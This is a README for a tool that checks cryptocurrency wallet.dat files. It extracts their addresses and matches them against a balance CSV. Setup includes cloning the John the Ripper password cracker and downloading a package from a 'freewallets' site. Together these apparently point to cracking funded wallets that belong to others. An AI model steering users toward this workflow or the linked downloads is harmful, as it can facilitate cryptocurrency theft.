# .dat Wallet Checker

This software is a **.dat wallet checker**.

## Features

- Verifies that the `.dat` file is readable and not corrupted.
- Extracts all addresses contained in the file.
- Compares the extracted addresses against a CSV file to check for balances.

## Usage

1. Provide a valid `.dat` wallet file.
2. Provide a CSV file containing address and balance information.
3. Run the script to check which addresses from the `.dat` file have a balance.

## Requirements

To set up the environment and install the necessary dependencies, follow these steps:


1. sudo apt install -y python3 python3-pip
2. sudo apt install libdb-dev libdb++-dev python3-dev build-essential
3. pip install bsddb3
4. git clone https://github.com/openwall/john.git
5. Download address balance Database (https://privatekey2bitcoin.com/freewallets/utxo.csv)
6. Start

Download all package: https://privatekey2bitcoin.com/freewallets/datchecker.zip

